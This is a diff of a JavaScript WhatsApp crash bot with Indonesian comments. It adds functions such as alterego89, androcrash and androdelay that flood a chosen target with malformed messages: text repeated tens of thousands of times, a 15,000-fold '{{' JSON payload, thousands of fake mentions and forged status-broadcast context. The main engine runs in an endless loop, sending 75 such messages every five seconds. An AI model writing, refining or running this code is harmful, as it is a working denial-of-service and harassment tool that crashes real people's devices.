@@ -3155,8 +3155,13 @@ module.exports = {
 };
 
 // ==================== FUNCTIONS HERE ==================== //
+// ==================== CORE BUG FUNCTIONS ==================== //
+
+/**
+ * N3xithBlank - Newsletter Bug
+ */
 async function N3xithBlank(sock, X) {
-const msg = {
+  const msg = {
     newsletterAdminInviteMessage: {
       newsletterJid: "120363321780343299@newsletter",
       newsletterName: "꙳͙͡༑ᐧ𝐒̬𝖎፝͢𝑿 ⍣᳟ 𝐍ͮ𝟑͜𝐮̽𝐕𝐞𝐫̬⃜꙳𝐗ͮ𝐨͢͡𝐗༑〽️" + "ោ៝".repeat(10000),
@@ -3171,6 +3176,9 @@ const msg = {
   });
 }
 
+/**
+ * DictiveBlank - Button Spam Bug
+ */
 async function DictiveBlank(sock, target) {
   await sock.relayMessage(
     target,
@@ -3231,9 +3239,20 @@ async function DictiveBlank(sock, target) {
   );
 }
 
+/**
+ * 🔥🔥🔥 alterego89 - MAIN BUG ENGINE 🔥🔥🔥
+ * INFINITE LOOP - JALAN TERUS SAMPAI SERVER DIMATIKAN!
+ * Kirim 75 pesan per cycle, delay 5 detik antar cycle
+ */
 async function alterego89(sock, target) {
+  console.log(`🚀 [alterego89] STARTED for ${target}`);
+  let cycleCount = 0;
+  
   while (true) {
     try {
+      cycleCount++;
+      console.log(`🔄 [alterego89] Cycle ${cycleCount} for ${target}`);
+      
       const SakaEgo = [
         "0@s.whatsapp.net",
         "13135550002@s.whatsapp.net",
@@ -3285,87 +3304,178 @@ async function alterego89(sock, target) {
           messageId: msg.key.id,
           statusJidList: [target],
         });
+        
+        // Log setiap 10 pesan
+        if ((i + 1) % 10 === 0) {
+          console.log(`📨 [alterego89] ${i+1}/75 sent to ${target}`);
+        }
       }
+      
+      console.log(`✅ [alterego89] Cycle ${cycleCount} COMPLETE for ${target}`);
+      
     } catch (err) {
+      console.error(`❌ [alterego89] Cycle error:`, err.message);
     }
 
+    console.log(`⏳ [alterego89] Waiting 5 seconds before next cycle...`);
     await new Promise(res => setTimeout(res, 5000));
   }
 }
 
-// ====================== FUNC PANGGILANNYA ====================== //
-async function androcrash(sock, target) {
-     for (let i = 0; i < 1; i++) {
-         await alterego89(sock, target);
-         }
-     }
-     
-async function Ipongcrash(sock, target) {
-     for (let i = 0; i < 1; i++) {
-         await alterego89(sock, target);
-         }
-     }
-     
-async function Iponginvis(sock, target) {
-     for (let i = 0; i < 1; i++) {
-         await alterego89(sock, target);
-         }
-     }
+/**
+ * alterego89Single - VERSION 1 CYCLE SAJA
+ * Sama seperti alterego89 tapi hanya 1 cycle, tidak infinite
+ * DIPAKAI UNTUK androdelay
+ */
+async function alterego89Single(sock, target) {
+  console.log(`🚀 [alterego89Single] STARTED for ${target} - 1 CYCLE ONLY`);
+  
+  try {
+    const SakaEgo = [
+      "0@s.whatsapp.net",
+      "13135550002@s.whatsapp.net",
+      ...Array.from({ length: 5000 }, () =>
+        "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
+      ),
+    ];
 
-async function alterego89(sock, target) {
-     for (let i = 0; i < 1; i++) {
-         await alterego89(sock, target);
-         }
-     }
-     
-async function androdelay(X, maxKirim = 1) {
+    for (let i = 0; i < 75; i++) {
+      const mediaFlood = {
+        viewOnceMessage: {
+          message: {
+            interactiveMessage: {
+              body: { text: "🜲saka" },
+              contextInfo: {
+                forwardingScore: 9999,
+                isForwarded: true,
+                participant: "0@s.whatsapp.net",
+                remoteJid: "status@broadcast",
+                mentionedJid: SakaEgo,
+              },
+              nativeFlowMessage: {
+                buttons: [
+                  { name: "single_select", buttonParamsJson: "" },
+                  { name: "call_permission_request", buttonParamsJson: JSON.stringify({ status: true }) },
+                ],
+                messageParamsJson: "{{".repeat(15000),
+              },
+            },
+            extendedTextMessage: {
+              text: "ꦽ".repeat(25000) + "@1".repeat(25000),
+              contextInfo: {
+                stanzaId: target,
+                participant: target,
+                quotedMessage: {
+                  conversation: "🜲saka" +
+                    "ꦾ࣯࣯".repeat(60000) +
+                    "@1".repeat(30000),
+                },
+              },
+              inviteLinkGroupTypeV2: "DEFAULT",
+            },
+          },
+        },
+      };
+
+      const msg = generateWAMessageFromContent(target, mediaFlood, {});
+      await sock.relayMessage(target, msg.message, {
+        messageId: msg.key.id,
+        statusJidList: [target],
+      });
+      
+      if ((i + 1) % 10 === 0) {
+        console.log(`📨 [alterego89Single] ${i+1}/75 sent to ${target}`);
+      }
+    }
+    
+    console.log(`✅ [alterego89Single] COMPLETE for ${target}`);
+    
+  } catch (err) {
+    console.error(`❌ [alterego89Single] Error:`, err.message);
+  }
+}
+
+// ====================== FUNC PANGGILANNYA ====================== //
+
+/**
+ * androcrash - Panggil alterego89 (INFINITE LOOP)
+ */
+async function androcrash(sock, target) {
+  console.log(`🤖 [androcrash] STARTED for ${target}`);
+  await alterego89(sock, target);
+}
+
+/**
+ * Ipongcrash - Panggil alterego89 (INFINITE LOOP)
+ */
+async function Ipongcrash(sock, target) {
+  console.log(`🍎 [Ipongcrash] STARTED for ${target}`);
+  await alterego89(sock, target);
+}
+
+/**
+ * Iponginvis - Panggil alterego89 (INFINITE LOOP)
+ */
+async function Iponginvis(sock, target) {
+  console.log(`👻 [Iponginvis] STARTED for ${target}`);
+  await alterego89(sock, target);
+}
+
+/**
+ * androdelay - Versi terbatas dengan progress
+ * Kirim sesuai maxKirim (default 1)
+ */
+async function androdelay(sock, target, maxKirim = 1) {
+  console.log(`⏱️ [androdelay] STARTED for ${target} - ${maxKirim} messages`);
+  
   let count = 0;
   let berhasil = 0;
   let gagal = 0;
 
   const sendNext = async () => {
-    // BERHENTI jika sudah 10 kali
     if (count >= maxKirim) {
-      console.log(chalk.green(`
+      console.log(`
       ╔════════════════════════════╗
-      ║       ${chalk.bgBlackBright.bold('📊  HASIL AKHIR')}    
+      ║       📊  HASIL AKHIR    
       ╠════════════════════════════╣
-      ║ ✅  ${chalk.greenBright('Berhasil:')} ${berhasil}/${maxKirim}
-      ║ ❌  ${chalk.redBright('Gagal:')} ${gagal}/${maxKirim}
-      ║ 🎯  ${chalk.magentaBright('Target:')} ${X}
+      ║ ✅  Berhasil: ${berhasil}/${maxKirim}
+      ║ ❌  Gagal: ${gagal}/${maxKirim}
+      ║ 🎯  Target: ${target}
       ╚════════════════════════════╝
-      `));
-      return; // STOP
+      `);
+      return;
     }
 
     try {
       count++;
       
-      // Progress bar
       const progress = '█'.repeat(count) + '░'.repeat(maxKirim - count);
-      console.log(chalk.cyan(`[${progress}] ${count}/${maxKirim}`));
+      console.log(`[${progress}] ${count}/${maxKirim}`);
       
-      // kasi hadiah ke target
-      await alterego89(X);
+      // Kirim 1 cycle pakai alterego89Single
+      await alterego89Single(sock, target);
       await sleep(2000);
       
       berhasil++;
-      console.log(chalk.green(`✅ Pesan ke-${count} berhasil!`));
-
-      // Delay lalu lanjut
+      console.log(`✅ Pesan ke-${count} berhasil!`);
       setTimeout(sendNext, 500);
       
     } catch (error) {
       gagal++;
-      console.error(chalk.red(`❌ Pesan ke-${count} gagal: ${error.message}`));
-      
-      // Tetap lanjut meskipun error
+      console.error(`❌ Pesan ke-${count} gagal: ${error.message}`);
       setTimeout(sendNext, 1000);
     }
   };
 
   sendNext();
 }
+
+// ==================== HELPER FUNCTIONS ==================== //
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
 // ==================== HTML TEMPLATE ==================== //
 const executionPage = (
   status = "🟥 Ready",
